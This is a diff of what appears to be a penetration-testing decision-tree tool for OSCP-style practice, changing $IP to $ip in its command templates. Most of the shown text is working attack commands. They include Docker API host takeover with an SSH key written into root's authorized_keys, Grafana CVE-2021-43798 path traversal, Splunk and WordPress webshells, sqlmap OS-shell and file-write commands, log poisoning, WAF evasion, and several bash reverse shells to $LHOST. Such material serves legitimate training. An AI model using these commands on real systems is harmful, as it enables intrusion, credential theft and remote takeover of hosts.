+curl -s http://$ip:9200/_cat/indices?v  # list all indices
+curl -s http://$ip:9200/_cat/nodes?v    # node info
 
 # Browse indices
-curl -s http://$IP:9200/<index>/_search?pretty
-curl -s http://$IP:9200/<index>/_search?q=password&pretty
-curl -s "http://$IP:9200/_all/_search?q=password&pretty&size=100"
+curl -s http://$ip:9200/<index>/_search?pretty
+curl -s http://$ip:9200/<index>/_search?q=password&pretty
+curl -s "http://$ip:9200/_all/_search?q=password&pretty&size=100"
 
 # Dump all data
-curl -s http://$IP:9200/<index>/_search?size=10000 | jq .
+curl -s http://$ip:9200/<index>/_search?size=10000 | jq .
 
 # Cluster settings
-curl -s http://$IP:9200/_cluster/settings
-curl -s http://$IP:9200/_nodes
+curl -s http://$ip:9200/_cluster/settings
+curl -s http://$ip:9200/_nodes
 
 # Search for credentials
-curl -s "http://$IP:9200/_all/_search?q=password+OR+passwd+OR+secret&pretty"
+curl -s "http://$ip:9200/_all/_search?q=password+OR+passwd+OR+secret&pretty"
 
 # Write to index (if writable — can inject data)
-curl -X POST http://$IP:9200/test/_doc/1 \\
+curl -X POST http://$ip:9200/test/_doc/1 \\
   -H "Content-Type: application/json" \\
   -d '{"cmd":"id"}'
 
 # Check for Kibana on 5601
-curl -s http://$IP:5601/api/status`,
+curl -s http://$ip:5601/api/status`,
     warn: "Elasticsearch 8.x has security enabled by default. Older versions (6.x, 7.x) are often unauthenticated.",
     choices: [
       { label: "Found credentials in indices", next: "creds_found" },
@@ -2228,25 +2228,25 @@ curl -s http://$IP:5601/api/status`,
     phase: "RECON",
     title: "Docker API (2375/2376)",
     body: "Exposed Docker API = instant root on the host. Mount the host filesystem into a privileged container. No password needed on port 2375.",
-    cmd: `nmap -p 2375,2376 -sV $IP
-curl -s http://$IP:2375/containers/json   # if returns data = unauthenticated
-curl -s http://$IP:2375/version
+    cmd: `nmap -p 2375,2376 -sV $ip
+curl -s http://$ip:2375/containers/json   # if returns data = unauthenticated
+curl -s http://$ip:2375/version
 
 # List containers and images
-export DOCKER_HOST="tcp://$IP:2375"
+export DOCKER_HOST="tcp://$ip:2375"
 docker ps -a
 docker images
 
 # Instant root — mount host filesystem
-docker -H tcp://$IP:2375 run -it --rm \\
+docker -H tcp://$ip:2375 run -it --rm \\
   --privileged -v /:/mnt alpine chroot /mnt sh
 
 # Read /etc/shadow
-docker -H tcp://$IP:2375 run --rm \\
+docker -H tcp://$ip:2375 run --rm \\
   -v /etc:/mnt/etc alpine cat /mnt/etc/shadow
 
 # Write SSH key to host root
-docker -H tcp://$IP:2375 run --rm \\
+docker -H tcp://$ip:2375 run --rm \\
   -v /root/.ssh:/mnt/.ssh alpine sh -c \\
   "echo 'ssh-rsa YOURKEY' >> /mnt/.ssh/authorized_keys"
 
@@ -2266,26 +2266,26 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh`,
     phase: "WINDOWS",
     title: "WinRM (5985/5986)",
     body: "WinRM is evil-winrm's playground. If you have creds or an NTLM hash for a user in the Remote Management Users group, you have a shell.",
-    cmd: `nmap -p 5985,5986 -sV $IP
-curl -s http://$IP:5985/wsman   # 200 = WinRM accessible
+    cmd: `nmap -p 5985,5986 -sV $ip
+curl -s http://$ip:5985/wsman   # 200 = WinRM accessible
 
 # evil-winrm — primary tool
-evil-winrm -i $IP -u administrator -p 'password'
-evil-winrm -i $IP -u 'DOMAIN\\user' -p 'password'
-evil-winrm -i $IP -u administrator -H <NTLM_HASH>
-evil-winrm -i $IP -u administrator -p 'password' -S  # SSL/5986
+evil-winrm -i $ip -u administrator -p 'password'
+evil-winrm -i $ip -u 'DOMAIN\\user' -p 'password'
+evil-winrm -i $ip -u administrator -H <NTLM_HASH>
+evil-winrm -i $ip -u administrator -p 'password' -S  # SSL/5986
 
 # Upload/download files in evil-winrm session
 upload /path/to/tool.exe C:\\Windows\\Temp\\tool.exe
 download C:\\Users\\admin\\Desktop\\proof.txt
 
 # crackmapexec to test creds
-crackmapexec winrm $IP -u user -p 'password'
-crackmapexec winrm $IP -u users.txt -p passwords.txt
-crackmapexec winrm $IP -u user -H <HASH>
+crackmapexec winrm $ip -u user -p 'password'
+crackmapexec winrm $ip -u users.txt -p passwords.txt
+crackmapexec winrm $ip -u user -H <HASH>
 
 # PowerShell remoting (from Windows)
-$sess = New-PSSession -ComputerName $IP -Credential (Get-Credential)
+$sess = New-PSSession -ComputerName $ip -Credential (Get-Credential)
 Enter-PSSession $sess`,
     warn: "User must be in 'Remote Management Users' or 'Administrators' group. WinRM is usually enabled on domain-joined machines.",
     choices: [
@@ -2371,32 +2371,32 @@ Enter-PSSession $sess`,
     phase: "RECON",
     title: "DNS (53)",
     body: "DNS zone transfers dump the entire domain map — every host, IP, subdomain. Even without zone transfer, brute-forcing reveals hidden internal hosts to pivot to.",
-    cmd: `nmap -p 53 -sV --script dns-zone-transfer $IP
-nmap -p 53 --script dns-brute --script-args dns-brute.domain=target.com $IP
+    cmd: `nmap -p 53 -sV --script dns-zone-transfer $ip
+nmap -p 53 --script dns-brute --script-args dns-brute.domain=target.com $ip
 
 # Zone transfer — often misconfigured on internal DNS
-dig axfr target.com @$IP
-dig axfr @$IP target.com
-host -l target.com $IP
+dig axfr target.com @$ip
+dig axfr @$ip target.com
+host -l target.com $ip
 dnsrecon -d target.com -t axfr
 
 # Standard enumeration
-dig @$IP target.com any        # All records
-dig @$IP target.com ns         # Name servers
-dig @$IP target.com mx         # Mail servers
-dig @$IP target.com txt        # TXT/SPF records (username hints)
-nslookup -type=any target.com $IP
+dig @$ip target.com any        # All records
+dig @$ip target.com ns         # Name servers
+dig @$ip target.com mx         # Mail servers
+dig @$ip target.com txt        # TXT/SPF records (username hints)
+nslookup -type=any target.com $ip
 
 # Subdomain brute force
 dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
-gobuster dns -d target.com -r $IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster dns -d target.com -r $ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 
 # Reverse DNS (find hosts on subnet)
-dnsrecon -r 192.168.1.0/24 -n $IP
-for i in $(seq 1 254); do host 192.168.1.$i $IP 2>/dev/null | grep "domain name"; done
+dnsrecon -r 192.168.1.0/24 -n $ip
+for i in $(seq 1 254); do host 192.168.1.$i $ip 2>/dev/null | grep "domain name"; done
 
 # Add discovered hosts to /etc/hosts
-echo "$IP hostname.target.com" >> /etc/hosts`,
+echo "$ip hostname.target.com" >> /etc/hosts`,
     warn: "Zone transfer (AXFR) works when DNS server is misconfigured to allow any client. Common on internal networks. Always try it — it takes one command.",
     choices: [
       { label: "Zone transfer worked — full host list", next: "targeted_scan" },
@@ -2409,16 +2409,16 @@ echo "$IP hostname.target.com" >> /etc/hosts`,
     phase: "WEB",
     title: "Grafana (3000)",
     body: "Grafana shows up constantly on practice machines. CVE-2021-43798 is unauthenticated path traversal — grab the database and extract admin credentials from it.",
-    cmd: `nmap -p 3000 -sV $IP
-curl -s http://$IP:3000/api/health    # Version info
-curl -s http://$IP:3000/login         # Check version on login page
+    cmd: `nmap -p 3000 -sV $ip
+curl -s http://$ip:3000/api/health    # Version info
+curl -s http://$ip:3000/login         # Check version on login page
 
 # CVE-2021-43798 — Path Traversal (Grafana < 8.3.0)
 # Read Grafana SQLite database (contains hashed passwords)
-curl --path-as-is -s "http://$IP:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
+curl --path-as-is -s "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
 
 # Or other plugins: dashboard, graph, table, text, stat, gauge
-curl --path-as-is "http://$IP:3000/public/plugins/graph/../../../../../../../../../etc/passwd"
+curl --path-as-is "http://$ip:3000/public/plugins/graph/../../../../../../../../../etc/passwd"
 
 # Extract credentials from grabbed database
 sqlite3 grafana.db "SELECT login,password FROM user;"
@@ -2435,8 +2435,8 @@ john --format=bcrypt grafana_hashes.txt --wordlist=rockyou.txt
 # MySQL, PostgreSQL, MSSQL connections = creds for lateral movement
 
 # Grafana API enumeration (if you have creds)
-curl -u admin:password http://$IP:3000/api/datasources
-curl -u admin:password http://$IP:3000/api/users`,
+curl -u admin:password http://$ip:3000/api/datasources
+curl -u admin:password http://$ip:3000/api/users`,
     warn: "CVE-2021-43798 works on plugins that are installed. If alertlist fails try: dashboard, graph, table, text, stat, gauge, barchart, timeseries.",
     choices: [
       { label: "Path traversal worked — got DB / creds", next: "creds_found" },
@@ -2449,9 +2449,9 @@ curl -u admin:password http://$IP:3000/api/users`,
     phase: "WEB",
     title: "Splunkd (8089/8000)",
     body: "Splunk = instant RCE if you have admin creds. Create a malicious app (Python script in a .tar.gz) and upload via the package manager. Port 8089 is the API, 8000 is the web UI.",
-    cmd: `nmap -p 8000,8089 -sV $IP
-curl -k https://$IP:8089/services      # API info
-curl -k -u admin:changeme https://$IP:8089/services/server/info  # Version
+    cmd: `nmap -p 8000,8089 -sV $ip
+curl -k https://$ip:8089/services      # API info
+curl -k -u admin:changeme https://$ip:8089/services/server/info  # Version
 
 # Default creds: admin:changeme  admin:password  admin:admin
 
@@ -2479,13 +2479,13 @@ tar -czf splunk_shell.tar.gz splunk_shell/
 
 # Upload via web UI: Apps > Manage Apps > Install app from file
 # OR via API:
-curl -k -u admin:changeme https://$IP:8089/services/apps/local \
+curl -k -u admin:changeme https://$ip:8089/services/apps/local \
   -F "name=splunk_shell" \
   -F "filename=true" \
   -F "appfile=@splunk_shell.tar.gz"
 
 # Brute force Splunk login
-hydra -l admin -P rockyou.txt $IP http-post-form \
+hydra -l admin -P rockyou.txt $ip http-post-form \
   "/en-US/account/login:username=^USER^&password=^PASS^&return_to=%2Fen-US%2F:Invalid"`,
     warn: "On Windows, Splunk runs as SYSTEM by default — instant privilege escalation. On Linux, check the splunk user's sudo rights.",
     choices: [
@@ -2499,24 +2499,24 @@ hydra -l admin -P rockyou.txt $IP http-post-form \
     phase: "RECON",
     title: "Memcached (11211)",
     body: "Memcached has no authentication. Dump all keys and values — it caches session tokens, credentials, and application data in plaintext.",
-    cmd: `nmap -p 11211 -sV --script memcached-info $IP
-nc -vn $IP 11211
+    cmd: `nmap -p 11211 -sV --script memcached-info $ip
+nc -vn $ip 11211
 
 # Dump all cached data
 # Step 1: Get slab IDs
-echo "stats slabs" | nc -q 1 $IP 11211
+echo "stats slabs" | nc -q 1 $ip 11211
 
 # Step 2: Get keys from each slab (replace N with slab number)
-echo "stats cachedump N 0" | nc -q 1 $IP 11211
+echo "stats cachedump N 0" | nc -q 1 $ip 11211
 
 # Step 3: Get value for each key
-echo "get <keyname>" | nc -q 1 $IP 11211
+echo "get <keyname>" | nc -q 1 $ip 11211
 
 # Automated dump script
 python3 -c "
 import socket
 s = socket.socket()
-s.connect(('$IP', 11211))
+s.connect(('$ip', 11211))
 s.send(b'stats slabs\r\n')
 slabs = s.recv(4096).decode()
 print('SLABS:', slabs[:500])
@@ -2532,8 +2532,8 @@ s.close()
 "
 
 # Quick version/stats
-echo "version" | nc -q 1 $IP 11211
-echo "stats" | nc -q 1 $IP 11211`,
+echo "version" | nc -q 1 $ip 11211
+echo "stats" | nc -q 1 $ip 11211`,
     warn: "Memcached data is application-specific. Look for session tokens (can be used for auth bypass), user objects, and any serialized data.",
     choices: [
       { label: "Found session tokens / creds in cache", next: "creds_found" },
@@ -2560,8 +2560,8 @@ echo "stats" | nc -q 1 $IP 11211`,
 #               /api/user/0   /api/user/-1
 
 # Horizontal priv esc (access other users' data)
-curl -H "Cookie: session=YOURS" http://$IP/api/user/124
-curl -H "Cookie: session=YOURS" http://$IP/api/orders/1
+curl -H "Cookie: session=YOURS" http://$ip/api/user/124
+curl -H "Cookie: session=YOURS" http://$ip/api/orders/1
 
 # Vertical priv esc (escalate to admin)
 # Look for role/admin fields in responses
@@ -2603,7 +2603,7 @@ rustscan -a $ip --ulimit 5000 -- -sV -sC -oN scans/targeted.txt
 
 # -- Nmap (exam-safe, always works) --------------------
 # Full TCP (background it)
-nmap -p- --min-rate 5000 -T4 $IP -oN scans/allports.txt
+nmap -p- --min-rate 5000 -T4 $ip -oN scans/allports.txt
 
 # UDP top 20 (background)
 sudo nmap -sU --top-ports 20 $ip -oN scans/udp.txt &
@@ -2843,16 +2843,16 @@ searchsploit -x [exploit/path]   # read before running
     cmd: `# -- WHEN NMAP OUTPUT LOOKS THIN ----------
 
 # 1. DID YOU SCAN ALL PORTS?
-nmap -p- --min-rate 5000 $IP -oN scans/allports.txt
+nmap -p- --min-rate 5000 $ip -oN scans/allports.txt
 # Services on high ports (8080, 8443, 8888, 9090, 10000) are common
 
 # 2. UDP — HAVE YOU CHECKED IT?
-sudo nmap -sU --top-ports 100 $IP -oN scans/udp.txt
+sudo nmap -sU --top-ports 100 $ip -oN scans/udp.txt
 # SNMP (161), TFTP (69), DNS (53) often only on UDP
 # SNMP especially — community string "public" = info dump
 
 # 3. WEB — IS THERE A VIRTUAL HOST?
-curl -sv http://$IP   # check the response title
+curl -sv http://$ip   # check the response title
 # If title shows a domain name: add to /etc/hosts and revisit
 # If 400 Bad Request on HTTPS: server requires SNI — use -k and hostname
 
@@ -2867,12 +2867,12 @@ curl -sv http://$IP   # check the response title
 # 5. RESPONSE SIZE VARIATION
 # Two 403s with different response sizes = different content behind them
 # Feroxbuster: filter by size to find anomalies
-feroxbuster -u http://$IP --filter-size [common_size]
+feroxbuster -u http://$ip --filter-size [common_size]
 
 # 6. NOTHING AT ALL?
 # Check if the service is actually up
-nc -nv $IP [port]
-telnet $IP [port]
+nc -nv $ip [port]
+telnet $ip [port]
 # Sometimes nmap misfires on rate-limited or filtered hosts`,
     warn: "A wall of 403s from feroxbuster is not nothing — it means content exists. The question is what HTTP method, header, or path variation gets you past the filter.",
     choices: [
@@ -2905,20 +2905,20 @@ telnet $IP [port]
 
 # -- FIRST MOVES ON A DC ------------------
 # 1. Get the domain name
-nmap -p 389 --script ldap-rootdse $IP
-crackmapexec smb $IP   # shows domain, hostname, OS
+nmap -p 389 --script ldap-rootdse $ip
+crackmapexec smb $ip   # shows domain, hostname, OS
 
 # 2. DNS zone transfer
-dig axfr [domain] @$IP
+dig axfr [domain] @$ip
 # If it works: full internal host map
 
 # 3. LDAP anonymous bind
-ldapsearch -x -h $IP -b "dc=[domain],dc=com"
+ldapsearch -x -h $ip -b "dc=[domain],dc=com"
 # If it works: full user/group list without creds
 
 # 4. SMB null session
-crackmapexec smb $IP -u "" -p "" --shares
-enum4linux-ng $IP
+crackmapexec smb $ip -u "" -p "" --shares
+enum4linux-ng $ip
 
 # 5. Do NOT try to brute force Kerberos
 # Account lockout is real on DCs
@@ -3085,7 +3085,7 @@ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \\
   -u http://FUZZ.domain.org -o scans/subdomains.txt
 
 # Add to /etc/hosts
-echo "$IP sub.domain.org" >> /etc/hosts`,
+echo "$ip sub.domain.org" >> /etc/hosts`,
     warn: "Verify every subdomain resolves to an in-scope IP before testing.",
     choices: [
       { label: "Found subdomain — enumerate it as new web target", next: "web_enum" },
@@ -3105,23 +3105,23 @@ xsstrike -u "http://$ip/page?param=test" --blind
 # --blind for blind XSS (out-of-band callback)
 
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \\
-  --hc 404 "http://$IP/page?FUZZ=test"
+  --hc 404 "http://$ip/page?FUZZ=test"
 
 # LFI wordlist
 wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \\
-  --hc 404 "http://$IP/page?file=FUZZ"
+  --hc 404 "http://$ip/page?file=FUZZ"
 
 # XSS fuzz
 wfuzz -c -z file,/usr/share/wordlists/Fuzzing/XSS.txt \\
-  "http://$IP/page?param=FUZZ"
+  "http://$ip/page?param=FUZZ"
 
 # Command injection fuzz (POST)
 wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
-  -d "field=FUZZ" "http://$IP/page"
+  -d "field=FUZZ" "http://$ip/page"
 
 # HTML escape fuzz
 wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt \\
-  "http://$IP/page?param=FUZZ"`,
+  "http://$ip/page?param=FUZZ"`,
     warn: null,
     choices: [
       { label: "Found LFI", next: "lfi" },
@@ -3141,9 +3141,9 @@ wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt \\
     title: "Parameter Found",
     body: "URL parameter detected. Test for SQLi, LFI, and command injection manually first before reaching for tools — understand what the app is doing.",
     cmd: `# Quick manual tests
-curl "http://$IP/page?id=1'"          # SQLi probe
-curl "http://$IP/page?file=../../../etc/passwd"  # LFI probe
-curl "http://$IP/page?cmd=;id"        # CMDi probe
+curl "http://$ip/page?id=1'"          # SQLi probe
+curl "http://$ip/page?file=../../../etc/passwd"  # LFI probe
+curl "http://$ip/page?cmd=;id"        # CMDi probe
 
 # Check response differences carefully`,
     warn: null,
@@ -3161,13 +3161,13 @@ curl "http://$IP/page?cmd=;id"        # CMDi probe
     title: "WordPress",
     body: "Run WPScan hard. Vulnerable plugins are the most reliable attack vector. Enumerate users, all plugins, all themes.",
     cmd: `# Full aggressive scan (free API token available at wpscan.com)
-wpscan --url http://$IP \\
+wpscan --url http://$ip \\
   --enumerate u,ap,at \\
   --plugins-detection aggressive \\
   --api-token <TOKEN>
 
 # Brute force once you have usernames
-wpscan --url http://$IP -U admin,editor \\
+wpscan --url http://$ip -U admin,editor \\
   -P /usr/share/wordlists/rockyou.txt \\
   --password-attack xmlrpc-multicall`,
     warn: null,
@@ -3185,14 +3185,14 @@ wpscan --url http://$IP -U admin,editor \\
     cmd: `# Option 1: Theme Editor
 # Appearance > Theme Editor > select 404.php
 # Add: <?php system($_GET['cmd']); ?>
-# Access: http://$IP/wp-content/themes/<theme>/404.php?cmd=id
+# Access: http://$ip/wp-content/themes/<theme>/404.php?cmd=id
 
 # Option 2: Malicious Plugin
 # Create plugin zip with PHP shell inside
 # Upload via Plugins > Add New > Upload
 
 # Once confirmed RCE — reverse shell
-curl "http://$IP/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"`,
+curl "http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"`,
     warn: null,
     choices: [
       { label: "RCE confirmed — catch shell", next: "reverse_shell" },
@@ -3214,7 +3214,7 @@ admin'--
 
 # Username enumeration — look for different response length/time
 wfuzz -c -z file,/opt/SecLists/Fuzzing/USERNAMES/usernames.txt \\
-  --hc 404,403 "http://$IP/users/FUZZ"
+  --hc 404,403 "http://$ip/users/FUZZ"
 
 # Brute force with hydra
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
@@ -3259,8 +3259,8 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
 ' UNION SELECT NULL,'a',NULL--
 
 # -- SQLMAP QUICK START -------------------
-sqlmap -u "http://$IP/page?id=1" --batch --level=2 --risk=2
-sqlmap -u "http://$IP/login" --data="user=a&pass=b" --batch`,
+sqlmap -u "http://$ip/page?id=1" --batch --level=2 --risk=2
+sqlmap -u "http://$ip/login" --data="user=a&pass=b" --batch`,
     warn: "Read the RESPONSE not just the status code. Content length change with same 200 = boolean blind. Delay = time-based blind. Error text = error-based. These are different attack paths requiring different techniques.",
     choices: [
       { label: "Error visible in response — error-based", next: "sqli_error" },
@@ -3377,13 +3377,13 @@ sqlmap -u "http://$IP/login" --data="user=a&pass=b" --batch`,
 
 # -- HAND OFF TO SQLMAP -------------------
 # Boolean-only technique flag:
-sqlmap -u "http://$IP/page?id=1" --technique=B --batch --level=3 --current-db
+sqlmap -u "http://$ip/page?id=1" --technique=B --batch --level=3 --current-db
 
-sqlmap -u "http://$IP/page?id=1" --technique=B --batch \
+sqlmap -u "http://$ip/page?id=1" --technique=B --batch \
   -D [dbname] -T users -C username,password --dump
 
 # POST data blind
-sqlmap -u "http://$IP/login" --data="user=a&pass=b" \
+sqlmap -u "http://$ip/login" --data="user=a&pass=b" \
   --technique=B --batch --level=3 --dbs
 
 # -- BURP INTRUDER (manual extraction) ----
@@ -3420,11 +3420,11 @@ sqlmap -u "http://$IP/login" --data="user=a&pass=b" \
 ' AND IF((SELECT user())='root',SLEEP(3),0)--
 
 # -- SQLMAP TIME-BASED --------------------
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --technique=T --time-sec=5 --batch --level=3 \
   --current-db
 
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --technique=T --time-sec=5 --batch \
   -D [dbname] -T users -C username,password --dump
 
@@ -3445,7 +3445,7 @@ sqlmap -u "http://$IP/page?id=1" \
     title: "SQLi — WAF Evasion",
     body: "WAF pattern-matching keywords and characters. PortSwigger: evasion uses encoding, comment injection, case variation, and whitespace alternatives to break patterns without breaking SQL syntax.",
     cmd: `# -- DETECT WAF ---------------------------
-wafw00f http://$IP
+wafw00f http://$ip
 # 403/406/501 on SQL payloads = WAF active
 
 # -- ENCODING BYPASSES --------------------
@@ -3475,7 +3475,7 @@ UnIoN aLl SeLeCt
 '%09UNION%09SELECT%09NULL,version(),NULL--
 
 # -- SQLMAP TAMPER SCRIPTS ----------------
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --tamper=space2comment,between,randomcase,charencode \
   --random-agent --delay=1 --batch --level=3
 
@@ -3488,7 +3488,7 @@ sqlmap -u "http://$IP/page?id=1" \
 # base64encode   — base64 the payload
 
 # Aggressive evasion stack:
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --tamper=space2comment,charencode,between,randomcase \
   --random-agent --delay=2 --retries=3 \
   --batch --level=5 --risk=3`,
@@ -3505,12 +3505,12 @@ sqlmap -u "http://$IP/page?id=1" \
     title: "SQLi — sqlmap Full Escalation",
     body: "sqlmap is allowed on OSCP. Use it confidently but understand each flag. The escalation ladder: confirm → enumerate → dump → OS shell → file write.",
     cmd: `# -- STAGE 1: CONFIRM + FINGERPRINT ------
-sqlmap -u "http://$IP/page?id=1" --batch --dbs
+sqlmap -u "http://$ip/page?id=1" --batch --dbs
 
 # -- STAGE 2: DUMP CREDENTIALS ------------
-sqlmap -u "http://$IP/page?id=1" --batch -D [dbname] --tables
-sqlmap -u "http://$IP/page?id=1" --batch -D [dbname] -T users --columns
-sqlmap -u "http://$IP/page?id=1" --batch -D [dbname] -T users \
+sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] --tables
+sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] -T users --columns
+sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] -T users \
   -C username,password --dump
 
 # -- POST / REQUEST FILE ------------------
@@ -3518,29 +3518,29 @@ sqlmap -u "http://$IP/page?id=1" --batch -D [dbname] -T users \
 sqlmap -r req.txt --batch --level=3 --risk=2 --dbs
 
 # -- COOKIE INJECTION ---------------------
-sqlmap -u "http://$IP/page" \
+sqlmap -u "http://$ip/page" \
   --cookie="id=1*" --batch --level=3
 
 # -- AUTHENTICATED SESSION -----------------
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --headers="Authorization: Bearer TOKEN" --batch
 
 # -- OS SHELL -----------------------------
 # Requires: MySQL FILE priv OR MSSQL sa/xp_cmdshell
-sqlmap -u "http://$IP/page?id=1" --os-shell
+sqlmap -u "http://$ip/page?id=1" --os-shell
 
 # -- FILE READ ----------------------------
-sqlmap -u "http://$IP/page?id=1" --file-read="/etc/passwd"
-sqlmap -u "http://$IP/page?id=1" --file-read="/var/www/html/config.php"
+sqlmap -u "http://$ip/page?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://$ip/page?id=1" --file-read="/var/www/html/config.php"
 
 # -- FILE WRITE (webshell) -----------------
 echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --file-write="/tmp/shell.php" \
   --file-dest="/var/www/html/shell.php"
 
 # -- MSSQL STACKED QUERIES → SHELL --------
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --technique=S --os-shell`,
     warn: "--os-shell can fail silently. If it opens but commands don't execute: wrong webroot path. Use --file-read to probe config files and confirm the correct path first.",
     choices: [
@@ -3570,8 +3570,8 @@ sqlmap -u "http://$IP/page?id=1" \
 ' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--
 
 # 4. Verify + execute
-curl "http://$IP/shell.php?cmd=id"
-curl "http://$IP/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
+curl "http://$ip/shell.php?cmd=id"
+curl "http://$ip/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
 
 # -- MSSQL: xp_cmdshell -------------------
 # Enable if disabled (requires sa or sysadmin)
@@ -3586,9 +3586,9 @@ curl "http://$IP/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%2
 '; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';--
 
 # -- SQLMAP SHORTCUT ----------------------
-sqlmap -u "http://$IP/page?id=1" --os-shell
+sqlmap -u "http://$ip/page?id=1" --os-shell
 # If webroot known:
-sqlmap -u "http://$IP/page?id=1" \
+sqlmap -u "http://$ip/page?id=1" \
   --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"`,
     warn: "INTO OUTFILE fails silently if: (1) FILE privilege missing, (2) file already exists — SQL won't overwrite, (3) path is wrong. Confirm FILE priv first. If file exists, delete it via another vector or use sqlmap --file-write which does overwrite.",
     choices: [
@@ -3768,17 +3768,17 @@ curl "http://$ip/uploads/shell.aspx?cmd=whoami"`,
     title: "Local File Inclusion → RCE",
     body: "LFI alone gets file reads. Escalate to RCE via log poisoning, PHP wrappers, or /proc/self/environ. Windows paths are completely different — know both. Use wordlists to find files fast.",
     cmd: `# -- DETECTION ----------------------------
-http://$IP/page?file=../../../../etc/passwd
-http://$IP/page?file=../../../etc/passwd
-http://$IP/page?file=/etc/passwd
+http://$ip/page?file=../../../../etc/passwd
+http://$ip/page?file=../../../etc/passwd
+http://$ip/page?file=/etc/passwd
 
 # -- FILTER BYPASSES ----------------------
 # Null byte (PHP < 5.3.4)
-http://$IP/page?file=../../../../etc/passwd%00
+http://$ip/page?file=../../../../etc/passwd%00
 # Double encode
-http://$IP/page?file=..%252f..%252f..%252fetc%252fpasswd
+http://$ip/page?file=..%252f..%252f..%252fetc%252fpasswd
 # Path truncation (old PHP)
-http://$IP/page?file=../../../../etc/passwd/././././././././././././././././.
+http://$ip/page?file=../../../../etc/passwd/././././././././././././././././.
 
 # -- LINUX HIGH-VALUE FILES ----------------
 /etc/passwd
@@ -3816,22 +3816,22 @@ C:/Windows/repair/SAM
 
 # -- FFUF LFI WORDLIST FUZZING -------------
 # Linux
-ffuf -u "http://$IP/page?file=FUZZ" \
+ffuf -u "http://$ip/page?file=FUZZ" \
   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
   -fw 0 -t 50
 
 # Windows — dedicated Windows path list
-ffuf -u "http://$IP/page?file=FUZZ" \
+ffuf -u "http://$ip/page?file=FUZZ" \
   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
   -fw 0 -t 50 -mc 200
 
 # Combined both OS (thorough)
-ffuf -u "http://$IP/page?file=FUZZ" \
+ffuf -u "http://$ip/page?file=FUZZ" \
   -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
   -fw 0 -t 50
 
 # Add traversal prefix if basic path blocked
-ffuf -u "http://$IP/page?file=../../../FUZZ" \
+ffuf -u "http://$ip/page?file=../../../FUZZ" \
   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
   -fw 0
 
@@ -3847,13 +3847,13 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
 
 # -- LOG POISONING → RCE ------------------
 # Step 1: Inject PHP into access log via User-Agent
-curl -A "<?php system(\$_GET['cmd']); ?>" http://$IP/
+curl -A "<?php system(\$_GET['cmd']); ?>" http://$ip/
 # Or via SSH login attempt (hits auth.log):
-ssh '<?php system($_GET["cmd"]); ?>'@$IP
+ssh '<?php system($_GET["cmd"]); ?>'@$ip
 
 # Step 2: Include log with command parameter
-http://$IP/page?file=/var/log/apache2/access.log&cmd=id
-http://$IP/page?file=/var/log/auth.log&cmd=id`,
+http://$ip/page?file=/var/log/apache2/access.log&cmd=id
+http://$ip/page?file=/var/log/auth.log&cmd=id`,
     warn: "Windows LFI: always try win.ini first as your canary. If it reads, LFI is confirmed on Windows. web.config and applicationHost.config frequently contain plaintext credentials — highest value reads on a Windows/IIS target.",
     choices: [
       { label: "Log poisoning RCE — get shell", next: "reverse_shell" },
@@ -3882,12 +3882,12 @@ $(id)
 ; curl http://$LHOST/
 
 # commix — automated, WAF-aware
-commix --url="http://$IP/page?param=" \\
+commix --url="http://$ip/page?param=" \\
   --level=3 --force-ssl --skip-waf --random-agent
 
 # wfuzz wordlist sweep
 wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
-  -d "field=FUZZ" "http://$IP/page"`,
+  -d "field=FUZZ" "http://$ip/page"`,
     warn: null,
     choices: [
       { label: "Confirmed RCE — get reverse shell", next: "reverse_shell" },
